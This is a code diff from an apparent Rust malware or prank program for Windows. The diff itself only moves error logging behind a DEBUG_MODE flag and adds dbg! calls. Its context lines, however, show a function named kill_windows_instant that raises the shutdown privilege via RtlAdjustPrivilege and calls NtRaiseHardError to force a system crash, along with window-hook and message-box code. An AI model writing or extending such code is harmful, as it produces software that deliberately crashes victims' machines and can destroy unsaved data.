@@ -14,6 +14,9 @@ use windows::Win32::{
     },
 };
 
+#[cfg(feature = "DEBUG_MODE")]
+use crate::utils::log::*;
+
 use crate::{
     data::msg::MSGS,
     ntdll::{
@@ -21,7 +24,6 @@ use crate::{
         ntdll_api::{NtRaiseHardErrorFn, RtlAdjustPrivilegeFn},
     },
     s_v,
-    utils::log::{write_log, LogLocation, LogType},
     wrap_windows_api::{
         wrap_get_current_thread_id, wrap_get_system_metrics, wrap_messagebox_a,
         wrap_set_windows_hook_ex_a, wrap_unhook_windows_hook_ex, WinError,
@@ -101,7 +103,7 @@ pub unsafe extern "system" fn window_proc(
         kill_windows().expect("Failed KillWindows() Proc");
         LRESULT(0)
     } else {
-        let res = DefWindowProcA(hwnd, msg, wparam, lparam);
+        let res = DefWindowProcA(dbg!(hwnd), dbg!(msg), dbg!(wparam), dbg!(lparam));
         if res.0 == 0 {
             panic!("Failed DefWindowProcA()\n");
         } else {
@@ -151,6 +153,7 @@ fn kill_windows_instant() -> Result<(), WinError> {
     match rtl_adjust_privilege_proc {
         Some(rtl_adjust_privilege) => rtl_adjust_privilege(19, 1, 0, &mut tmp1),
         None => {
+            #[cfg(feature = "DEBUG_MODE")]
             write_log(
                 LogType::ERROR,
                 LogLocation::LOG,
@@ -167,6 +170,7 @@ fn kill_windows_instant() -> Result<(), WinError> {
             nt_raise_hard_error(NTSTATUS(0xc0000022_u32 as i32), 0, 0, 0, 6, &mut tmp2)
         }
         None => {
+            #[cfg(feature = "DEBUG_MODE")]
             write_log(
                 LogType::ERROR,
                 LogLocation::LOG,
